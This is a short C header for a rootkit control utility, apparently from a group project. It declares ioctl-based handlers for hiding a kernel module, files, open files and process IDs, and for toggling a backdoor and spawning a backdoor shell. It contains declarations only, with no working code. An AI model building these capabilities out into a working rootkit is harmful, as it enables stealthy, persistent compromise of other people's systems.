#ifndef _GROUP7_RKCTL_H
#define _GROUP7_RKCTL_H

#define ARGVCMP(i, x) (!strcmp(argv[i], (x)))
#define ASSERT_ARGC(x, msg) \
    do { \
        if (argc <= x) { \
            fprintf(stderr, "%s: %s\n", progname, msg); \
            exit(1); \
        } \
    } while (0)


typedef struct {
    int (*f)(void *);
    void * arg;
} cmd_t;

cmd_t parse_input(int, char **);
int issue_ioctl(unsigned long, const char *);
void help();

int handle_ping(void *);
int handle_modhide(void *);
int handle_filehide(void *);
int handle_openhide(void *);
int handle_pidhide(void *);
int handle_backdoor(void *);
int handle_shellbd(void *);
int handle_togglebd(void *);
int handle_logging(void *);

#endif//_GROUP7_RKCTL_H
